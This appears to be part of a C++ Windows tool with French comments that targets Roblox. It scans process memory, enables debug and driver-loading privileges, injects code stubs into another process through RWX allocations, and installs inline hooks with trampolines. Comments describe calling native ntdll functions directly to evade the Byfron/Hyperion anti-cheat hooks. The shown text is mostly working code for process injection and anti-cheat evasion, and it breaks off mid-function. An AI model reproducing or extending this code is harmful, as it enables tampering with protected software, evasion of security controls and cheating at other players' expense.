#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <memory>
#include <mutex>
#include <optional>
#include <string>
#include <string_view>
#include <unordered_map>
#include <unordered_set>
#include <utility>
#include <vector>

// ---------------------------------------------------------------------------
// Sandbox / Network Mocking — variable globale de controle (thread-safe).
// true  -> tous les appels HTTP sont rediriges vers localhost:8080
// false -> mode production (URLs intactes)
// ---------------------------------------------------------------------------
static std::atomic<bool> g_sandbox_mode{false};

// ---------------------------------------------------------------------------
// Proxy Configuration State — Transparent Proxy Interception (Méthode 2).
// g_proxy_url est défini via `--proxy <url>` (ex: --proxy 127.0.0.1:8080).
// Chaîne vide = mode production normal (aucun proxy, zéro impact perf).
// Accès protégé par mutex : le flag est lu depuis plusieurs threads
// (WinHTTP / Module 7 et cliente libcurl / Module 8) sans data race.
// ---------------------------------------------------------------------------
static std::string g_proxy_url;
static std::mutex  g_proxy_mutex;

static std::string GetProxyUrl() {
    std::lock_guard<std::mutex> lock(g_proxy_mutex);
    return g_proxy_url;
}

static void SetProxyUrl(std::string url) {
    std::lock_guard<std::mutex> lock(g_proxy_mutex);
    g_proxy_url = std::move(url);
}

#ifdef _WIN32
#  define WIN32_LEAN_AND_MEAN
#  include <windows.h>
#  include <tlhelp32.h>
#  include <winhttp.h>
#  include <psapi.h>
#  include <iphlpapi.h>
#  include <wchar.h>
#  pragma comment(lib, "advapi32.lib")   // OpenProcessToken, AdjustTokenPrivileges...
#  pragma comment(lib, "winhttp.lib")    // achat Roblox web API (WinHTTP)
#  pragma comment(lib, "user32.lib")     // Snyper : SendInput, SetCursorPos, EnumWindows...
#  pragma comment(lib, "psapi.lib")      // --trace : EnumProcessModulesEx, GetModuleInformation
#  pragma comment(lib, "iphlpapi.lib")   // --trace : GetExtendedTcpTable / GetExtendedUdpTable
#  include "client_simulator.hpp"        // bibliothèque statique client_simulator.lib (libcurl)
#  include "gateway.hpp"                 // passerelle de test HTTPS (mode --gateway)
#  include "rules.hpp"
#  include "mock_controller.hpp"
#  include "mockgen.hpp"
#  include "ghidra_bridge.hpp"           // mode --ghidra : CLI ghidra-rpc integre (Python venv)
#endif

// Un octet de signature : valeur + indicateur "wildcard".
struct PatternByte {
    uint8_t value;
    bool    wildcard;
};

using Pattern = std::vector<PatternByte>;

// Convertit "48 89 5C 24 ?? 50" (ou "48 89 5C 24 ? 50") en Pattern.
// Retourne std::nullopt si la chaîne est mal formée.
std::optional<Pattern> ParsePattern(std::string_view text) {
    auto hex = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return -1;
    };

    Pattern out;
    size_t i = 0;
    while (i < text.size()) {
        if (text[i] == ' ') { ++i; continue; }

        if (text[i] == '?') {
            out.push_back({0, true});
            ++i;
            if (i < text.size() && text[i] == '?') ++i;  // accepte "?" et "??"
        } else {
            if (i + 1 >= text.size()) return std::nullopt;
            int hi = hex(text[i]), lo = hex(text[i + 1]);
            if (hi < 0 || lo < 0) return std::nullopt;
            out.push_back({static_cast<uint8_t>(hi << 4 | lo), false});
            i += 2;
        }
        if (i < text.size() && text[i] != ' ') return std::nullopt;
    }
    return out;
}

// Scan dans un buffer contigu déjà lisible. Retourne l'offset trouvé.
std::optional<size_t> FindPattern(const uint8_t* data, size_t size, const Pattern& pattern) {
    const size_t n = pattern.size();
    if (n == 0 || size < n) return std::nullopt;  // évite l'underflow de "size - n"

    // Premier octet non-wildcard : sert d'ancre pour memchr (bien plus rapide
    // qu'une boucle octet par octet).
    size_t anchor = 0;
    while (anchor < n && pattern[anchor].wildcard) ++anchor;
    if (anchor == n) return 0;  // que des wildcards : match immédiat

    const size_t last = size - n;  // dernier offset de départ valide
    const uint8_t key = pattern[anchor].value;

    size_t pos = 0;
    while (pos <= last) {
        auto* hit = static_cast<const uint8_t*>(
            std::memchr(data + pos + anchor, key, last - pos + 1));
        if (!hit) break;

        size_t candidate = static_cast<size_t>(hit - data) - anchor;
        bool match = true;
        for (size_t j = anchor + 1; j < n; ++j) {
            if (!pattern[j].wildcard && data[candidate + j] != pattern[j].value) {
                match = false;
                break;
            }
        }
        if (match) return candidate;
        pos = candidate + 1;
    }
    return std::nullopt;
}

// Retourne tous les offsets (utile pour vérifier qu'une signature est unique).
std::vector<size_t> FindAllPatterns(const uint8_t* data, size_t size, const Pattern& pattern) {
    std::vector<size_t> results;
    size_t base = 0;
    while (base < size) {
        auto r = FindPattern(data + base, size - base, pattern);
        if (!r) break;
        results.push_back(base + *r);
        base += *r + 1;
    }
    return results;
}

#ifdef _WIN32
static bool IsReadableRegion(const MEMORY_BASIC_INFORMATION& mbi) {
    const DWORD readable = PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
                           PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY;
    return mbi.State == MEM_COMMIT && (mbi.Protect & readable) &&
           !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS));
}

// Scan d'une plage d'adresses du processus courant, en ne lisant QUE les pages
// engagées et lisibles (sinon : access violation sur les zones non mappées).
// Plage semi-ouverte [start, end).
std::optional<uintptr_t> FindPatternInProcess(uintptr_t start, uintptr_t end, const Pattern& pattern) {
    if (pattern.empty() || start >= end) return std::nullopt;

    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = start;
    while (addr < end && VirtualQuery(reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi))) {
        uintptr_t regionBase = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t regionEnd  = regionBase + mbi.RegionSize;

        if (IsReadableRegion(mbi)) {
            uintptr_t from = (std::max)(addr, regionBase);
            uintptr_t to   = (std::min)(end, regionEnd);
            // Note : une signature à cheval sur deux régions n'est pas détectée.
            // En pratique le code d'un module est dans une seule section .text.
            if (auto r = FindPattern(reinterpret_cast<const uint8_t*>(from), to - from, pattern))
                return from + *r;
        }
        addr = regionEnd;
    }
    return std::nullopt;
}

// ---------------------------------------------------------------------------
// Accès à un processus externe
// ---------------------------------------------------------------------------

struct HandleCloser {
    void operator()(HANDLE h) const {
        if (h && h != INVALID_HANDLE_VALUE) CloseHandle(h);
    }
};
using UniqueHandle = std::unique_ptr<void, HandleCloser>;

// Vrai si le jeton du processus courant est élevé (UAC validée).
bool IsProcessElevated() {
    HANDLE raw = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &raw)) return false;
    UniqueHandle token(raw);

    TOKEN_ELEVATION elevation{};
    DWORD size = 0;
    if (!GetTokenInformation(token.get(), TokenElevation, &elevation, sizeof(elevation), &size))
        return false;
    return elevation.TokenIsElevated != 0;
}

// Active SeDebugPrivilege (présent mais désactivé dans un jeton admin élevé).
// Nécessaire pour ouvrir des processus d'autres utilisateurs / services.
// Active un privilege (present mais desactive dans un jeton admin eleve).
// Retourne false si le privilege est absent du jeton (ERROR_NOT_ALL_ASSIGNED).
bool EnablePrivilege(const wchar_t* name) {
    HANDLE raw = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &raw))
        return false;
    UniqueHandle token(raw);
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(token.get(), FALSE, &tp, sizeof(tp), nullptr, nullptr);
    return GetLastError() == ERROR_SUCCESS;
}

// Jeu de privileges requis par SIVX64 : SeDebugPrivilege (controle de sa
// dispatch Create), SeLoadDriverPrivilege et SeSystemProfilePrivilege.
bool EnablePrivilegesSiv() {
    bool dbg  = EnablePrivilege(L"SeDebugPrivilege");
    bool load = EnablePrivilege(L"SeLoadDriverPrivilege");
    bool prof = EnablePrivilege(L"SeSystemProfilePrivilege");
    if (!dbg)
        std::cerr << "[siv] SeDebugPrivilege indisponible : " << GetLastError() << '\n';
    return dbg && load && prof;
}

bool EnableDebugPrivilege() {
    return EnablePrivilege(L"SeDebugPrivilege");
}

struct ProcessInfo {
    DWORD        pid;
    std::wstring exeName;
};

// Liste les processus dont le nom d'exécutable correspond à `name`
// (insensible à la casse, ".exe" facultatif : "game" == "Game.exe").
std::vector<ProcessInfo> FindProcessesByName(std::string_view name) {
    std::vector<ProcessInfo> found;

    // argv est en page de code ANSI ; szExeFile est en UTF-16.
    int len = MultiByteToWideChar(CP_ACP, 0, name.data(), static_cast<int>(name.size()), nullptr, 0);
    std::wstring wanted(static_cast<size_t>(len), L'\0');
    MultiByteToWideChar(CP_ACP, 0, name.data(), static_cast<int>(name.size()), wanted.data(), len);

    auto endsWithExe = [](const std::wstring& s) {
        return s.size() >= 4 && _wcsicmp(s.c_str() + s.size() - 4, L".exe") == 0;
    };
    if (!endsWithExe(wanted)) wanted += L".exe";

    UniqueHandle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (snapshot.get() == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot a echoue, erreur " << GetLastError() << '\n';
        return found;
    }

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    for (BOOL ok = Process32FirstW(snapshot.get(), &entry); ok; ok = Process32NextW(snapshot.get(), &entry)) {
        if (_wcsicmp(entry.szExeFile, wanted.c_str()) == 0)
            found.push_back({entry.th32ProcessID, entry.szExeFile});
    }
    return found;
}

enum class AccessMode {
    Full,      // PROCESS_ALL_ACCESS
    ReadOnly,  // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ : suffisant pour
               // VirtualQueryEx + ReadProcessMemory, refusé moins souvent
};

// Ouvre le processus cible avec les droits correspondant au mode.
UniqueHandle OpenTargetProcess(DWORD pid, AccessMode mode = AccessMode::Full) {
    const DWORD access = mode == AccessMode::Full
                             ? PROCESS_ALL_ACCESS
                             : PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
    const char* accessName = mode == AccessMode::Full
                                 ? "PROCESS_ALL_ACCESS"
                                 : "PROCESS_QUERY_INFORMATION | PROCESS_VM_READ";

    UniqueHandle proc(OpenProcess(access, FALSE, pid));
    if (!proc) {
        DWORD err = GetLastError();
        std::cerr << "OpenProcess(" << accessName << ", " << pid << ") a echoue, erreur " << err;
        if (err == ERROR_INVALID_PARAMETER) std::cerr << " : aucun processus avec ce PID";
        if (err == ERROR_ACCESS_DENIED) {
            std::cerr << " : acces refuse (processus protege ou non eleve ?)";
            if (mode == AccessMode::Full) std::cerr << "\n  -> essaie --read-only";
        }
        std::cerr << '\n';
    }
    return proc;
}

// Scanne toute la mémoire lisible d'un processus externe via ReadProcessMemory.
// Lecture par blocs de 1 Mio avec chevauchement de (taille signature - 1)
// octets : une signature à cheval sur deux blocs d'une même région est trouvée,
// et jamais comptée deux fois.
std::vector<uintptr_t> FindAllPatternsInRemoteProcess(HANDLE proc, const Pattern& pattern,
                                                      size_t maxResults = SIZE_MAX) {
    std::vector<uintptr_t> results;
    const size_t n = pattern.size();
    if (!proc || n == 0) return results;

    const size_t kChunk = size_t{1} << 20;
    std::vector<uint8_t> buffer;

    auto scanBuffer = [&](uintptr_t base, size_t size) {
        for (size_t off : FindAllPatterns(buffer.data(), size, pattern)) {
            if (results.size() >= maxResults) return;
            results.push_back(base + off);
        }
    };

    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = 0;
    while (results.size() < maxResults &&
           VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == sizeof(mbi)) {
        uintptr_t regionBase = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t regionEnd  = regionBase + mbi.RegionSize;
        if (regionEnd <= addr) break;  // protection contre une boucle infinie

        if (IsReadableRegion(mbi)) {
            for (uintptr_t chunk = regionBase; chunk < regionEnd && results.size() < maxResults;
                 chunk += kChunk) {
                // want <= kChunk + n - 1 => tout match commence avant chunk + kChunk,
                // donc le bloc suivant ne peut pas le retrouver.
                size_t want = (std::min)(kChunk + n - 1, static_cast<size_t>(regionEnd - chunk));
                buffer.resize(want);

                SIZE_T got = 0;
                if (ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk), buffer.data(), want, &got)) {
                    scanBuffer(chunk, got);
                    continue;
                }

                // Lecture partielle (page devenue illisible entre-temps) :
                // repli page par page, les pages en échec sont ignorées.
                const size_t kPage = 0x1000;
                for (size_t off = 0; off < want; off += kPage) {
                    size_t len = (std::min)(kPage, want - off);
                    if (ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk + off),
                                          buffer.data(), len, &got))
                        scanBuffer(chunk + off, got);
                }
            }
        }
        addr = regionEnd;
    }
    return results;
}

// ===========================================================================
// Injection de code : allocation + écriture d'un stub dans la cible
// ===========================================================================

// Alloue une région RWX dans le processus cible et y écrit `stubSize` octets
// depuis `pLocalStub`. Retourne l'adresse distante, ou nullptr en cas d'échec
// (la région allouée est libérée si l'écriture échoue, pour ne pas fuiter).
// W^X : si le stub n'a pas besoin de se réécrire, préfère PAGE_READWRITE puis
// VirtualProtectEx(PAGE_EXECUTE_READ) — une page RWX est un signal pour un EDR.
//
// ** Native API bypass ** : WriteProcessMemory est hooké par Byfron/Hyperion.
// L'appel retourne TRUE sans écrire les octets réels → le stub exécute des
// zéros → crash silencieux. On utilise NtWriteVirtualMemory (ntdll) directement
// via GetProcAddress : l'anti-cheat hook le wrapper Win32 mais pas toujours
// l'appel syscall natif sous-jacent.
typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
static pfnNtWriteVirtualMemory g_NtWriteVM = nullptr;
static pfnNtAllocateVirtualMemory g_NtAllocVM = nullptr;

static bool WriteRemoteMemory(HANDLE hProcess, LPVOID base, const void* data, size_t size) {
    if (!g_NtWriteVM) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) g_NtWriteVM = reinterpret_cast<pfnNtWriteVirtualMemory>(
            GetProcAddress(ntdll, "NtWriteVirtualMemory"));
    }
    SIZE_T written = 0;
    bool ok = false;
    if (g_NtWriteVM) {
        NTSTATUS st = g_NtWriteVM(hProcess, base, const_cast<void*>(data), size, &written);
        ok = (st >= 0) && (written == size);
    }
    if (!ok) {
        written = 0;
        ok = WriteProcessMemory(hProcess, base, data, size, &written) && written == size;
    }
    return ok;
}

// Allocation native : NtAllocateVirtualMemory contourne le hook VirtualAllocEx
// (l'anti-cheat peut retourner une adresse "shadow" non mappée dans la cible).
static LPVOID AllocRemoteMemory(HANDLE hProcess, size_t size, DWORD protect = PAGE_READWRITE) {
    if (!g_NtAllocVM) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) g_NtAllocVM = reinterpret_cast<pfnNtAllocateVirtualMemory>(
            GetProcAddress(ntdll, "NtAllocateVirtualMemory"));
    }
    if (g_NtAllocVM) {
        PVOID addr = nullptr;
        SIZE_T sz = size;
        NTSTATUS st = g_NtAllocVM(hProcess, &addr, 0, &sz, MEM_COMMIT | MEM_RESERVE, protect);
        if (st >= 0 && addr) return static_cast<LPVOID>(addr);
    }
    // Fallback : VirtualAllocEx
    return VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
}

LPVOID AllocateAndWriteStub(HANDLE hProcess, const void* pLocalStub, size_t stubSize) {
    if (!hProcess || !pLocalStub || stubSize == 0) {
        std::cerr << "AllocateAndWriteStub : arguments invalides\n";
        return nullptr;
    }
    LPVOID remoteMem = AllocRemoteMemory(hProcess, stubSize, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        std::cerr << "AllocRemoteMemory a echoue : " << GetLastError() << '\n';
        return nullptr;
    }
    if (!WriteRemoteMemory(hProcess, remoteMem, pLocalStub, stubSize)) {
        std::cerr << "WriteRemoteMemory a echoue (" << stubSize << " octets)\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return nullptr;
    }
    FlushInstructionCache(hProcess, remoteMem, stubSize);
    return remoteMem;
}

// ===========================================================================
// Mini décodeur de LONGUEUR x64 (fail-safe).
// Couvre les instructions courantes d'un prologue de fonction. Sur un opcode
// non répertorié il renvoie len == 0, et l'appelant refuse de poser le hook
// plutôt que de couper une instruction en deux.
// ===========================================================================
struct InsnInfo {
    size_t len        = 0;   // 0 => non décodée : refuser le hook
    int    ripDispOff = -1;  // offset du disp32 RIP-relatif dans l'instruction, sinon -1
    int    rel32Off   = -1;  // offset du rel32 d'une branche near, sinon -1
    bool   shortRel   = false; // jmp/jcc/loop court : non relocalisable -> refus
};

inline InsnInfo DecodeInsn(const uint8_t* p, size_t avail) {
    const InsnInfo bad{};   // len = 0
    size_t i = 0;
    bool opsz = false, rexW = false;

    // Préfixes hérités (on ne retient que 0x66 pour la taille d'immédiat).
    while (i < avail) {
        uint8_t b = p[i];
        if (b == 0x66) { opsz = true; ++i; }
        else if (b == 0x67 || b == 0xF0 || b == 0xF2 || b == 0xF3 || b == 0x2E ||
                 b == 0x36 || b == 0x3E || b == 0x26 || b == 0x64 || b == 0x65) ++i;
        else break;
    }
    if (i < avail && (p[i] & 0xF0) == 0x40) { rexW = (p[i] & 0x08) != 0; ++i; }  // REX
    if (i >= avail) return bad;

    const int immZ = opsz ? 2 : 4;               // immédiat 16/32
    const int immV = rexW ? 8 : (opsz ? 2 : 4);  // immédiat de mov r64, imm

    auto noModRM = [&](int imm) -> InsnInfo {
        i += imm;
        if (i > avail) return bad;
        InsnInfo r; r.len = i; return r;
    };
    auto withModRM = [&](int imm) -> InsnInfo {
        if (i >= avail) return bad;
        uint8_t m = p[i++];
        uint8_t mod = m >> 6, rm = m & 7;
        InsnInfo r;
        int disp = 0; bool rip = false;
        if (mod != 3) {
            bool sib = (rm == 4);
            uint8_t base = 6;  // valeur neutre != 5
            if (sib) { if (i >= avail) return bad; base = p[i++] & 7; }
            if (mod == 0) {
                if (!sib && rm == 5) { disp = 4; rip = true; }   // [rip+disp32]
                else if (sib && base == 5) disp = 4;             // [disp32 + index]
            } else if (mod == 1) disp = 1;
            else disp = 4;
        }
        if (rip) r.ripDispOff = (int)i;
        i += disp + imm;
        if (i > avail) return bad;
        r.len = i;
        return r;
    };

    uint8_t op = p[i++];

    // --- sans ModRM ni immédiat ---
    if ((op >= 0x50 && op <= 0x5F) ||      // push/pop r64
        (op >= 0x91 && op <= 0x97) ||      // xchg eax, r
        op == 0x90 || op == 0x98 || op == 0x99 || op == 0x9C || op == 0x9D ||
        op == 0xC3 || op == 0xC9 || op == 0xCC || op == 0xF4)
        return noModRM(0);

    // --- immédiat, sans ModRM ---
    if (op == 0x68) return noModRM(immZ);          // push imm32
    if (op == 0x6A) return noModRM(1);             // push imm8
    if (op >= 0xB8 && op <= 0xBF) return noModRM(immV); // mov r64, imm
    if (op == 0xA8) return noModRM(1);
    if (op == 0xA9) return noModRM(immZ);

    // --- branches near relatives (relocalisables) ---
    if (op == 0xE8 || op == 0xE9) { InsnInfo r; r.rel32Off = (int)i; i += 4; r.len = i; return r; }
    // --- branches courtes / loop : PAS relocalisables ---
    if (op == 0xEB || (op >= 0x70 && op <= 0x7F) || (op >= 0xE0 && op <= 0xE3)) {
        InsnInfo r; r.shortRel = true; r.len = i + 1; return r;
    }

    // --- ALU génériques : base+0..3 = ModRM, +4 = imm8(AL), +5 = immZ(eAX) ---
    for (uint8_t base : {0x00,0x08,0x10,0x18,0x20,0x28,0x30,0x38}) {
        if (op >= base && op <= base + 3) return withModRM(0);
        if (op == base + 4) return noModRM(1);
        if (op == base + 5) return noModRM(immZ);
    }

    // --- ModRM sans immédiat ---
    if (op == 0x63 || op == 0x84 || op == 0x85 || op == 0x86 || op == 0x87 ||
        (op >= 0x88 && op <= 0x8B) || op == 0x8D || op == 0x8F ||
        (op >= 0xD0 && op <= 0xD3) || op == 0xFE || op == 0xFF)
        return withModRM(0);

    // --- ModRM + immédiat ---
    if (op == 0x80 || op == 0x83 || op == 0x6B || op == 0xC0 || op == 0xC1 || op == 0xC6)
        return withModRM(1);
    if (op == 0x81 || op == 0x69 || op == 0xC7)
        return withModRM(immZ);
    if (op == 0xF6) { int reg = (p[i] >> 3) & 7; return withModRM(reg <= 1 ? 1 : 0); }
    if (op == 0xF7) { int reg = (p[i] >> 3) & 7; return withModRM(reg <= 1 ? immZ : 0); }

    // --- deux octets (0x0F ...) ---
    if (op == 0x0F) {
        if (i >= avail) return bad;
        uint8_t op2 = p[i++];
        if (op2 >= 0x80 && op2 <= 0x8F) { InsnInfo r; r.rel32Off = (int)i; i += 4; r.len = i; return r; } // jcc near
        if (op2 == 0x05 || op2 == 0x0B || op2 == 0x31 || op2 == 0xA2) return noModRM(0);  // syscall/ud2/rdtsc/cpuid
        if (op2 == 0x1E || op2 == 0x1F || op2 == 0xAF || op2 == 0xD6 || op2 == 0xEF ||
            (op2 >= 0x10 && op2 <= 0x17) || (op2 >= 0x28 && op2 <= 0x2F) ||
            (op2 >= 0x40 && op2 <= 0x4F) || (op2 >= 0x51 && op2 <= 0x5F) ||
            op2 == 0x6E || op2 == 0x6F || op2 == 0x7E || op2 == 0x7F ||
            op2 == 0xB6 || op2 == 0xB7 || op2 == 0xBE || op2 == 0xBF)
            return withModRM(0);
        return bad;  // 0F inconnu
    }
    return bad;      // opcode inconnu
}

// ===========================================================================
// Hook inline avec trampoline (processus externe)
// ===========================================================================
struct InlineHook {
    uintptr_t            target     = 0;   // fonction patchée
    uintptr_t            trampoline = 0;   // APPELLE CECI pour exécuter l'original
    std::vector<uint8_t> original;         // octets volés (pour RemoveInlineHook)
};

// jmp qword ptr [rip+0] ; dq addr   (14 octets, sans limite des +/-2 Go)
inline void WriteAbsJmp(uint8_t* dst, uintptr_t addr) {
    dst[0] = 0xFF; dst[1] = 0x25; dst[2] = dst[3] = dst[4] = dst[5] = 0;
    std::memcpy(dst + 6, &addr, sizeof(addr));
}

// ---------------------------------------------------------------------------
// Gel des threads le temps du patch : évite qu'un thread exécute la fonction
// pendant l'écriture non atomique des 14 octets. RAII : reprise à la sortie.
// ---------------------------------------------------------------------------
struct FrozenThreads {
    std::vector<HANDLE> handles;
    FrozenThreads() = default;
    FrozenThreads(const FrozenThreads&) = delete;
    FrozenThreads& operator=(const FrozenThreads&) = delete;
    FrozenThreads(FrozenThreads&& o) noexcept : handles(std::move(o.handles)) {}
    FrozenThreads& operator=(FrozenThreads&& o) noexcept {
        if (this != &o) { resumeAll(); handles = std::move(o.handles); }
        return *this;
    }
    ~FrozenThreads() { resumeAll(); }
    void resumeAll() {
        for (HANDLE h : handles) { ResumeThread(h); CloseHandle(h); }
        handles.clear();
    }
};

// Suspend tous les threads du process `pid` sauf `skipTid` (0 = aucun).
inline FrozenThreads FreezeThreads(DWORD pid, DWORD skipTid) {
    FrozenThreads f;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return f;
    THREADENTRY32 te{}; te.dwSize = sizeof(te);
    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID != pid || te.th32ThreadID == skipTid) continue;
        HANDLE h = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                              FALSE, te.th32ThreadID);
        if (!h) continue;
        if (SuspendThread(h) == (DWORD)-1) { CloseHandle(h); continue; }
        f.handles.push_back(h);
    }
    CloseHandle(snap);
    return f;
}

// Si le RIP d'un thread gelé tombe dans les octets volés [target, target+len),
// le rebase dans la trampoline (mêmes offsets d'instruction) pour qu'il reprenne
// sur du code valide au lieu d'un opcode à moitié patché.
inline void RelocateFrozenIPs(const FrozenThreads& f, uintptr_t target, uintptr_t tramp, size_t len) {
    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_CONTROL;
    for (HANDLE h : f.handles) {
        if (!GetThreadContext(h, &ctx)) continue;
        if (ctx.Rip >= target && ctx.Rip < target + len) {
            std::cerr << "InstallInlineHook : thread en plein prologue (RIP 0x" << std::hex
                      << ctx.Rip << std::dec << "), IP relocalise vers la trampoline\n";
            ctx.Rip = tramp + (ctx.Rip - target);
            SetThreadContext(h, &ctx);
        }
    }
}

// Pose un hook inline sur `target` -> `detour`, avec trampoline pour rappeler
// l'original. Le détour DOIT, à sa fin, sauter vers h.trampoline (ou l'appeler)
// pour exécuter la fonction d'origine.
inline std::optional<InlineHook> InstallInlineHook(HANDLE hProcess, uintptr_t target, uintptr_t detour,
                                                   bool freezeThreads = true) {
    if (!hProcess || !target || !detour) { std::cerr << "InstallInlineHook : args invalides\n"; return std::nullopt; }

    // 1. Lire le prologue et découper en instructions ENTIÈRES jusqu'à >= 14 octets.
    uint8_t code[32];
    SIZE_T got = 0;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(target), code, sizeof(code), &got) || got < 14) {
        std::cerr << "InstallInlineHook : lecture du prologue echouee : " << GetLastError() << '\n';
        return std::nullopt;
    }
    struct Fix { int off; bool rip; };
    std::vector<Fix> fixes;
    size_t len = 0;
    while (len < 14) {
        InsnInfo in = DecodeInsn(code + len, got - len);
        if (in.len == 0 || in.shortRel) {
            std::cerr << "InstallInlineHook : instruction non geree a +" << len << " (0x"
                      << std::hex << (int)code[len] << std::dec << ") - hook refuse\n";
            return std::nullopt;
        }
        if (in.ripDispOff >= 0) fixes.push_back({ (int)len + in.ripDispOff, true  });
        if (in.rel32Off  >= 0) fixes.push_back({ (int)len + in.rel32Off,  false });
        len += in.len;
    }

    // 2. Réserver la trampoline dans la cible.
    LPVOID tramp = VirtualAllocEx(hProcess, nullptr, len + 14, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!tramp) { std::cerr << "InstallInlineHook : VirtualAllocEx echoue : " << GetLastError() << '\n'; return std::nullopt; }
    const uintptr_t trampAddr = reinterpret_cast<uintptr_t>(tramp);

    // 3. Copier les octets volés et relocaliser RIP-relatif + rel32.
    std::vector<uint8_t> buf(len + 14);
    std::memcpy(buf.data(), code, len);
    const int64_t delta = (int64_t)target - (int64_t)trampAddr;  // src - dst
    for (const Fix& f : fixes) {
        int32_t v; std::memcpy(&v, buf.data() + f.off, 4);
        if (!f.rip) {  // branche vers l'intérieur du bloc volé : reste interne
            int64_t tgt = (int64_t)target + f.off + 4 + v;
            if (tgt >= (int64_t)target && tgt < (int64_t)target + (int64_t)len) continue;
        }
        int64_t nv = (int64_t)v + delta;
        if (nv < INT32_MIN || nv > INT32_MAX) {
            std::cerr << "InstallInlineHook : reloc hors +/-2Go - hook refuse\n";
            VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE); return std::nullopt;
        }
        int32_t n32 = (int32_t)nv; std::memcpy(buf.data() + f.off, &n32, 4);
    }
    WriteAbsJmp(buf.data() + len, target + len);  // jmp -> suite de l'original

    SIZE_T w = 0;
    if (!WriteProcessMemory(hProcess, tramp, buf.data(), buf.size(), &w) || w != buf.size()) {
        std::cerr << "InstallInlineHook : ecriture trampoline echouee : " << GetLastError() << '\n';
        VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE); return std::nullopt;
    }
    FlushInstructionCache(hProcess, tramp, buf.size());

    // 4. Patcher target : jmp abs -> detour, puis NOP (0x90) jusqu'à `len`.
    InlineHook hook; hook.target = target; hook.trampoline = trampAddr; hook.original.assign(code, code + len);
    std::vector<uint8_t> patch(len, 0x90);
    WriteAbsJmp(patch.data(), detour);

    {   // --- section critique : threads gelés le temps de l'écriture ---
        FrozenThreads frozen;
        if (freezeThreads) {
            DWORD pid  = GetProcessId(hProcess);
            DWORD skip = (pid == GetCurrentProcessId()) ? GetCurrentThreadId() : 0;
            frozen = FreezeThreads(pid, skip);
            RelocateFrozenIPs(frozen, target, trampAddr, len);
        }

        DWORD oldProt = 0;
        if (!VirtualProtectEx(hProcess, reinterpret_cast<LPVOID>(target), len, PAGE_EXECUTE_READWRITE, &oldProt)) {
            std::cerr << "InstallInlineHook : VirtualProtectEx echoue : " << GetLastError() << '\n';
            VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE); return std::nullopt;
        }
        bool ok = WriteProcessMemory(hProcess, reinterpret_cast<LPVOID>(target), patch.data(), len, &w) && w == len;
        DWORD tmp = 0; VirtualProtectEx(hProcess, reinterpret_cast<LPVOID>(target), len, oldProt, &tmp);
        if (!ok) {
            std::cerr << "InstallInlineHook : ecriture du patch echouee : " << GetLastError() << '\n';
            VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE); return std::nullopt;
        }
        FlushInstructionCache(hProcess, reinterpret_cast<LPVOID>(target), len);
    }   // threads repris ici

    std::cout << "Hook inline : 0x" << std::hex << target << " -> 0x" << detour
              << " (trampoline 0x" << trampAddr << ", " << std::dec << len << " octets voles)\n";
    return hook;
}

inline bool RemoveInlineHook(HANDLE hProcess, const InlineHook& h) {
    if (!hProcess || !h.target || h.original.empty()) return false;
    const size_t len = h.original.size();
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProcess, reinterpret_cast<LPVOID>(h.target), len, PAGE_EXECUTE_READWRITE, &oldProt))
        return false;
    SIZE_T w = 0;
    bool ok = WriteProcessMemory(hProcess, reinterpret_cast<LPVOID>(h.target), h.original.data(), len, &w) && w == len;
